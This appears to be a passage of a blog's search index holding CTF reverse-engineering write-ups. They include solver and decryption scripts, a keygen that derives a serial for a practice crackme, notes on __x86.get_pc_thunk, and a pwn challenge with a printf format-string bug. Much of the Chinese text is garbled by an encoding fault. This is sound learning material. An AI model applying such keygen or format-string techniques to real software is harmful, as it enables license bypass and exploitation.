flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><h2 id="5-WUSTCTF2020-level1"><a href="#5-WUSTCTF2020-level1" class="headerlink" title="5.[WUSTCTF2020]level1"></a>5.[WUSTCTF2020]level1</h2><p>æºç å’Œé€»è¾‘éƒ½å¾ˆç®€å•ï¼Œå¯¹flagè¿›è¡ŒåŠ å¯†ï¼Œç„¶åè¿˜ç»™äº†outputæ–‡ä»¶ï¼Œåº”è¯¥å°±æ˜¯flagåŠ å¯†åçš„è¾“å‡ºç»“æœ<br><img src="https://i.loli.net/2021/04/10/lTe58pKU7iIGdRz.png" alt=""></p><p>å†™ä¸ªè§£å¯†è„šæœ¬å°±è¡Œäº†ï¼ˆ1ï¼Œ3ï¼Œ5ï¼Œ7â€¦ä¸1ç›¸ä¸ä¸º1ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flagReverse = [</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">198</span>,</span><br><span class="line">    <span class="number">232</span>,</span><br><span class="line">    <span class="number">816</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">1536</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">    <span class="number">6144</span>,</span><br><span class="line">    <span class="number">984</span>,</span><br><span class="line">    <span class="number">51200</span>,</span><br><span class="line">    <span class="number">570</span>,</span><br><span class="line">    <span class="number">92160</span>,</span><br><span class="line">    <span class="number">1200</span>,</span><br><span class="line">    <span class="number">565248</span>,</span><br><span class="line">    <span class="number">756</span>,</span><br><span class="line">    <span class="number">1474560</span>,</span><br><span class="line">    <span class="number">800</span>,</span><br><span class="line">    <span class="number">6291456</span>,</span><br><span class="line">    <span class="number">1782</span>,</span><br><span class="line">    <span class="number">65536000</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagReverse)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] &gt;&gt; i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flagReverse[i] = flagReverse[i] // i</span><br><span class="line"></span><br><span class="line">    flagReverse[i] = <span class="built_in">chr</span>(flagReverse[i])</span><br><span class="line"></span><br><span class="line">flag = flagReverse[<span class="number">1</span>:]</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><h2 id="6-Youngter-drive"><a href="#6-Youngter-drive" class="headerlink" title="6.Youngter-drive"></a>6.Youngter-drive</h2><blockquote><p>UPXè„±å£³:<a href="https://github.com/upx/upx/releases">https://github.com/upx/upx/releases</a></p></blockquote><p>å…ˆå»ä¸ªå£³<br><img src="https://i.loli.net/2021/04/11/cGXKI38bUisLfzJ.png" alt=""></p><p>mainå‡½æ•°ä¸­å¯åŠ¨äº†ä¸¤ä¸ªå­çº¿ç¨‹<br><img src="https://i.loli.net/2021/04/11/rgxAZITfhmq1ozW.png" alt=""></p><p>ç¬¬ä¸€ä¸ªçº¿ç¨‹å¯¹äºæˆ‘ä»¬è¾“å…¥çš„flagè¿›è¡Œæ›¿æ¢<br><img src="https://i.loli.net/2021/04/11/ZTrNDyLRgpScUB9.png" alt=""></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_411940</span><span class="params">(<span class="keyword">int</span> source, <span class="keyword">int</span> target_in_data_1d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+D3h] [ebp-5h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_BYTE *)(target_in_data_1d + source);</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &lt; <span class="number">97</span> || v3 &gt; <span class="number">122</span>) &amp;&amp; (v3 &lt; <span class="number">65</span> || v3 &gt; <span class="number">90</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="string">&#x27;a&#x27;</span> || v3 &gt; <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// å¤§å†™å­—æ¯ - 38ï¼Œå³27-52</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">38</span>];</span><br><span class="line">    <span class="comment">// å°†ç´¢å¼•æ˜ å°„åˆ°å¦å¤–ä¸€å¼ è¡¨è¿›è¡Œæ›¿æ¢</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = off_418000[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// å°å†™å­—æ¯ - 96ï¼Œå³1 - 26</span></span><br><span class="line">    *(_BYTE *)(target_in_data_1d + source) = off_418000[<span class="number">0</span>][*(<span class="keyword">char</span> *)(target_in_data_1d + source) - <span class="number">96</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªçº¿ç¨‹åªæ˜¯å‡å»dataæ®µçš„ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥å‘ç‚¹1å°±æ˜¯åœ¨æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­ï¼Œåªæœ‰å¶æ•°ä½ï¼ˆ0ï¼Œ1ï¼Œ3,â€¦29ï¼‰è¢«è¿›è¡Œæ›¿æ¢äº†<br>æ›¿æ¢é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œè§ä¸Šé¢è´´çš„æ³¨é‡Š</p><p>å‘ç‚¹2å°±æ˜¯æœ€åcheckçš„æ—¶å€™åªæ£€æŸ¥äº†29ä½ï¼Œæœ€åä¸€ä½æœçš„wpæ˜¯å¡«Eï¼ˆå¥½åƒåœ¨å®‰æ’èµ›çš„æ—¶å€™å¡«å•¥éƒ½å¯¹ï¼Œç„¶åçœ‹äº†ä¸€ä¸ªå¸ˆå‚…çš„wpè§‰å¾—åº”è¯¥å¡«Zï¼Œå› ä¸ºæ˜ å°„å›æ¥æ­£å¥½æ˜¯NULL<br><img src="https://i.loli.net/2021/04/11/d4vbaU7eFPiVZwx.png" alt=""></p><p>è„šæœ¬å¦‚ä¸‹ï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">flagRe = <span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsySa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> v3 = *(_BYTE *)(target_in_data_1d + source);</span></span><br><span class="line"><span class="string">  if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) )</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  if ( v3 &lt; &#x27;a&#x27; || v3 &gt; &#x27;z&#x27; )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;&amp;&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    result = off_418000[0];</span></span><br><span class="line"><span class="string">    *(_BYTE *)(target_in_data_1d + source) = off_418000[0][*(char *)(target_in_data_1d + source) - &#x27;`&#x27;];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line">i = <span class="number">0x1d</span></span><br><span class="line"><span class="keyword">while</span> i &gt; -<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> key.find(flagRe[i]):</span><br><span class="line">        position = key.find(flagRe[i])</span><br><span class="line">        <span class="keyword">if</span> position &lt;= <span class="number">26</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">96</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="built_in">chr</span>(position + <span class="number">38</span>))</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">    flag.append(flagRe[i])</span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">reversed</span>(flag)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure></p><p>å¤§å¸ˆå‚…çš„wpï¼Œè¯¦ç»†è§£é‡Šäº†è¿™ä¸ªç¨‹åºä¸­åè°ƒè¯•çš„éƒ¨åˆ†ï¼Œå€¼å¾—é˜…è¯»:<a href="https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/">https://hx1997.github.io/2018/07/22/anheng-july-re-youngter-drive/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__x86.get_pc_thunk.axå‡½æ•°</title>
      <link href="2021/04/06/ax/"/>
      <url>2021/04/06/ax/</url>
      
        <content type="html"><![CDATA[<h2 id="x86-get-pc-thunk"><a href="#x86-get-pc-thunk" class="headerlink" title="__x86.get_pc_thunk"></a>__x86.get_pc_thunk</h2><p>cè¯­è¨€åˆ°æ±‡ç¼–æŒ‡ä»¤è¿™ç¯‡åšæ–‡ä¸­ï¼Œæˆ‘ä¸€å¼€å§‹é€šè¿‡gccç¼–è¯‘æºæ–‡ä»¶ï¼Œæ²¡æœ‰å…³é—­åœ°å€éšæœºåŒ–è¿™ä¸ªé€‰é¡¹ï¼Œåœ¨ç¼–è¯‘å‡ºçš„ç¨‹åºçš„åæ±‡ç¼–ä¸­ï¼Œå‘ç°äº†å¾ˆå¥‡æ€ªçš„callæŒ‡ä»¤<br>æºç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">long</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> c = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">23</span>;</span><br><span class="line"><span class="keyword">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="keyword">short</span> c = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åæ±‡ç¼–</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x11ad</span> &lt;main&gt;                           endbr32                                                                                    </span><br><span class="line">â”‚   <span class="number">0x11b1</span> &lt;main+<span class="number">4</span>&gt;                         <span class="keyword">push</span>   <span class="built_in">ebp</span>                                                                                 </span><br><span class="line">â”‚   <span class="number">0x11b2</span> &lt;main+<span class="number">5</span>&gt;                         <span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span>                                                                             </span><br><span class="line">â”‚   <span class="number">0x11b4</span> &lt;main+<span class="number">7</span>&gt;                         <span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x10</span>                                                                            </span><br><span class="line">â”‚   <span class="number">0x11b7</span> &lt;main+<span class="number">10</span>&gt;                        <span class="keyword">call</span>   <span class="number">0x11d9</span> &lt;__x86<span class="number">.</span>get_pc_thunk<span class="number">.</span><span class="built_in">ax</span>&gt;                                                      </span><br><span class="line">â”‚   <span class="number">0x11bc</span> &lt;main+<span class="number">15</span>&gt;                        <span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x2e20</span>                                                                          </span><br><span class="line">â”‚   <span class="number">0x11c1</span> &lt;main+<span class="number">20</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x4</span>],<span class="number">0x17</span>                                                            </span><br><span class="line">â”‚   <span class="number">0x11c8</span> &lt;main+<span class="number">27</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x7</span>],<span class="number">0x62</span>                                                             </span><br><span class="line">â”‚   <span class="number">0x11cc</span> &lt;main+<span class="number">31</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">WORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0x6</span>],<span class="number">0xc</span>                                                             </span><br><span class="line">â”‚   <span class="number">0x11d2</span> &lt;main+<span class="number">37</span>&gt;                        <span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span> </span><br><span class="line">â”‚   <span class="number">0x11d7</span> &lt;main+<span class="number">42</span>&gt;                        <span class="keyword">leave</span>                                                                                      </span><br><span class="line">â”‚   <span class="number">0x11d8</span> &lt;main+<span class="number">43</span>&gt;                        <span class="keyword">ret</span>                           </span><br></pre></td></tr></table></figure><p>åœ¨main+10çš„ä½ç½®å¤„è°ƒç”¨äº†ä¸€ä¸ª__x86.get_pc_thunk.axï¼Œå¾ˆå¥½å¥‡è¿™ä¸ªæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼ŒgdbåŠ¨æ€è°ƒè¯•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://i.loli.net/2021/04/06/OD2N7xLbXAhJ5sS.png" style="zoom:50%;" /></p><p>å‘ç°äº†åªæœ‰ä¸¤æ¡æ±‡ç¼–æŒ‡ä»¤</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">esp</span>]</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>espå­˜çš„å°±æ˜¯mainå‡½æ•°çš„åœ°å€ï¼ˆå› ä¸ºåœ¨mainå‡½æ•°ä¸­calläº†å½“å‰è¿™ä¸ªå‡½æ•°ï¼‰</p><p>ç®€å•è¯´è¿™ä¸ªæŒ‡ä»¤å°±ç›¸å½“äº<code>mov eax,eip</code></p><p>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯getåˆ°mainå‡½æ•°çš„åœ°å€</p><p>å¾ˆå¥½å¥‡ï¼Œä¸ºä»€ä¹ˆè¦è·å¾—mainå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬ç»§ç»­å¾€ä¸‹èµ°</p><p><img src="https://i.loli.net/2021/04/06/2UemXT6PY31hN4B.png" alt="" style="zoom:50%;" /></p><p>å‘ç°eaxè¿™é‡Œé€šè¿‡addä¸€ä¸ªæ•°å­—åå˜æˆäº†GOTè¡¨çš„åœ°å€ï¼Œè¿™æ ·å°±ä¸éš¾ç†è§£äº†ï¼ˆå…³äºä»€ä¹ˆæ˜¯GOTè¡¨å’ŒPLTè¡¨ï¼Œæˆ‘ä¼šåé¢å†å±•å¼€æ–‡ç« è¿›è¡Œå­¦ä¹ è®°å½•ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°åœ¨x86ä¸Šçš„PICï¼ˆposition independent codeï¼‰ä¸­ä½¿ç”¨ï¼Œç”¨æ¥å®ç°å¯¹æ¨¡å—çš„å†…éƒ¨æ•°æ®è¿›è¡Œè®¿é—®ï¼Œæ¯”å¦‚å…¨å±€å˜é‡ã€‚æˆ‘ä»¬åœ¨mainå‡½æ•°ä¸­è®¿é—®ä¸€ä¸‹å…¨å±€å˜é‡xï¼Œç”¨gdbæŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œæœç„¶å¯ä»¥çœ‹åˆ°ç¨‹åºè®¿é—®xæ˜¯é€šè¿‡GOTè¿›è¡Œçš„ã€‚</p><p><img src="https://i.loli.net/2021/04/06/1QBToDwrjivpK52.png" style="zoom:50%;" /></p><blockquote><p>äº‹å®ä¸Šç±»ä¼¼çš„å‡½æ•°è¿˜æœ‰ï¼š<code>__x86.get_pc_thunk.bx</code>ï¼Œ<code>__x86.get_pc_thunk.cx</code>ï¼Œ <code>__x86.get_pc_thunk.dx</code>ã€‚åŠŸèƒ½æ˜¯ç±»ä¼¼çš„ï¼Œåªä¸è¿‡ä¼ å…¥çš„å¯„å­˜å™¨åˆ†åˆ«ä¸º<code>%ebx</code>ï¼Œ <code>%ecx</code>ï¼Œ <code>%edx</code>ã€‚æ—©æœŸç‰ˆæœ¬çš„ç¼–è¯‘å™¨ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å«<code>__i686.get_pc_thunk.ax</code>ã€‚</p></blockquote><h2 id="å…³é—­pie"><a href="#å…³é—­pie" class="headerlink" title="å…³é—­pie"></a>å…³é—­pie</h2><p>ä½¿ç”¨gccç¼–è¯‘å‘½ä»¤</p><p><code>gcc -fno-pie</code></p><p>å…³é—­pieï¼Œè°ƒè¯•ç¨‹åºå‘ç°å·²ç»ä¸éœ€è¦å†é€šè¿‡è¯¥å‡½æ•°è¿›è¡Œå¯»å€äº†</p><p><img src="https://i.loli.net/2021/04/06/JO6fZ7A2sMKHxzk.png" style="zoom:50%;" /></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://stackoverflow.com/questions/50105581/how-do-i-get-rid-of-call-x86-get-pc-thunk-ax">c - How do i get rid of call    __x86.get_pc_thunk.ax - Stack Overflow</a></p><p><a href="https://qphikk.cn/archives/84">__x86.get_pc_thunk.axå‡½æ•°</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cè¯­è¨€åˆ°æ±‡ç¼–æŒ‡ä»¤1</title>
      <link href="2021/04/06/c%E8%AF%AD%E8%A8%80%E5%88%B0%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A41/"/>
      <url>2021/04/06/c%E8%AF%AD%E8%A8%80%E5%88%B0%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A41/</url>
      
        <content type="html"><![CDATA[<p>(æœªå®Œå·¥)</p><p>è¿‘æœŸå‘ç°pwnçŸ¥è¯†åœ¨æ¯”èµ›ä¸­è¶Šæ¥è¶Šæ³¨é‡é€†å‘çš„æŠ€èƒ½ï¼Œæˆ‘è¿™æ‰æ·±åˆ»è®¤è¯†åˆ°äºŒè¿›åˆ¶å®‰å…¨æ˜¯ä¸åˆ†å®¶çš„ï¼Œé‚å¼€å‘ä¸€ä¸‹é€†å‘çš„æŠ€èƒ½ï¼Œå¤šæ³¨é‡ä¸€ä¸‹åŸºæœ¬åŠŸçš„æŠ€èƒ½ã€‚</p><h2 id="è°ƒç”¨çº¦å®š"><a href="#è°ƒç”¨çº¦å®š" class="headerlink" title="è°ƒç”¨çº¦å®š"></a>è°ƒç”¨çº¦å®š</h2><p>å¸¸ç”¨çš„è°ƒç”¨çº¦å®šæœ‰__cdecl(cè§„èŒƒ),pascal,stdcall,Fastcall<br>gccç¼–è¯‘å™¨é»˜è®¤é‡‡ç”¨__cdeclè°ƒç”¨çº¦å®š<br>åœ¨ä¸Šè¿°è°ƒç”¨çº¦å®šä¸­ï¼Œåªæœ‰__cdeclå¹³è¡¡æ ˆçš„è§’è‰²æ˜¯è°ƒç”¨è€…ï¼Œå…¶ä½™éƒ½æ˜¯å­ç¨‹åº</p><h2 id="cè¯­è¨€ç¿»è¯‘ä¸ºæ±‡ç¼–"><a href="#cè¯­è¨€ç¿»è¯‘ä¸ºæ±‡ç¼–" class="headerlink" title="cè¯­è¨€ç¿»è¯‘ä¸ºæ±‡ç¼–"></a>cè¯­è¨€ç¿»è¯‘ä¸ºæ±‡ç¼–</h2><h3 id="å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡"><a href="#å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡"></a>å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡</h3>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crackme</title>
      <link href="2021/03/23/crackme1/"/>
      <url>2021/03/23/crackme1/</url>
      
        <content type="html"><![CDATA[<h2 id="Peachâ€™s-Crackme"><a href="#Peachâ€™s-Crackme" class="headerlink" title="Peachâ€™s Crackme"></a>Peachâ€™s Crackme</h2><p><img src="https://i.loli.net/2021/03/23/7OH8pcVqwFJzQdS.png" alt="1.png"><br>ç¨‹åºç®€ä»‹ï¼Œä¸€ä¸ªç®€å•çš„æ³¨å†ŒåŠŸèƒ½<br><img src="https://i.loli.net/2021/03/23/txOWv6PMi8fRLHA.png" alt="3.png"></p><p>é¦–å…ˆx64dbgåˆ†æä¸€ä¸‹ï¼Œæ ¹æ®ç¨‹åºåŠŸèƒ½æ‰¾æ‰¾å­—ç¬¦ä¸²å•¥çš„<br><img src="https://i.loli.net/2021/03/23/nSVNcGjRhlZF7kK.png" alt="4.png"><br>IDAé™æ€åˆ†æï¼Œæ¥å®šä½ä¸€ä¸‹åœ°å€å•¥çš„ï¼Œç„¶åf5å¤§æ³•ç›´æ¥è¯»ä¼ªä»£ç <br><img src="https://i.loli.net/2021/03/23/DZecAmIPGyu4Ftg.png" alt="5.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub_4081C0(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">v5 = sub_401A94(String);</span><br><span class="line"><span class="keyword">if</span> ( v5 == atoi(v7) )</span><br><span class="line">    MessageBoxW(a1, <span class="string">L&quot;You are such a gud boi! Lemme pat you!&quot;</span>, <span class="string">L&quot;Good boi!&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå®šä½åˆ°è¿™ä¸ªåœ°æ–¹<br>ä¸»è¦åˆ†æä¸€ä¸‹v5å’Œv7éƒ½æ˜¯å•¥ï¼Œé€šè¿‡idaçš„ä¸‡èƒ½xå¼•ç”¨å¤§æ³•ï¼Œè¿½è¸ªåˆ°ä¸€ä¸ªwin32å‡½æ•°ï¼ŒæŸ¥æ‰‹å†ŒæŠŠåŠŸèƒ½å’Œå‚æ•°ç»™ææ¸…æ¥šå°±okäº†<br><img src="https://i.loli.net/2021/03/23/q9bHQUNZxaL6gSc.png" alt="2.png"></p><p>æœ€ç»ˆå‘ç°v5æ˜¯æ³¨å†Œæ—¶çš„åå­—ï¼Œv7æ˜¯æˆ‘ä»¬è¾“å…¥çš„åºåˆ—å·ï¼ŒäºŒè€…ä¹‹é—´é€šè¿‡ä¸€ä¸ªå‡½æ•°æ¥å¤„ç†ï¼Œæœ¬åœ°è¿è¡Œä¸€ä¸‹å‡½æ•°å°±è¡Œäº†ï¼Œç›´æ¥å‡ºåºåˆ—å·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+5Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> a1[] = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line">  v3 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">    v3 += a1[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="number">431136</span> * v3 - <span class="number">3000</span>) / <span class="number">2</span> - *a1));</span><br><span class="line">&#125;          </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/23/WFdr8CReqc2Qliu.png" alt="6.png"></p><h2 id="WarGames"><a href="#WarGames" class="headerlink" title="WarGames"></a>WarGames</h2><ul><li>level : 2</li><li>Platform : Unix/linux etc.</li><li>Description : Use ./WarGames pass</li></ul><p>å¤ªç®€å•äº†ï¼ŒæŠŠä»–çš„ç®—æ³•è·‘ä¸€éå°±æŠŠç»“æœå‡ºæ¥äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> crackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwnç³»åˆ—1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸‹buuctf pwnçš„write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘å°±æ˜¯ä¹‹å‰æŠŠflagæ–‡ä»¶è¯»å…¥å†…å­˜ï¼Œç„¶åè¾“å…¥å­—ç¬¦ä¸²å’Œflagå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”<br>ä¸»å‡½æ•°å­˜åœ¨æ 